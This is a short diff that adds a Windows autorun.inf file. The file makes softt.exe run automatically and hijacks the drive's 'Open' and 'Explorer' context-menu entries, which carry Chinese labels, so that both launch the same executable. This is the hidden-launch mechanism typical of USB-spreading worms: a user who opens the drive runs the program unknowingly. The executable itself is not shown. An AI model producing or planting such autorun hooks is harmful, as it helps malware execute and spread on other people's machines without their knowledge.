@@ -1,0 +1,7 @@
+[AutoRun]
+Open=softt.exe
+Shell\Open=打开(&O)
+Shell\Open\Command=softt.exe
+Shell\Open\Default=1
+Shell\Explore=资源管理器(&X)
+Shell\Explore\Command=softt.exe
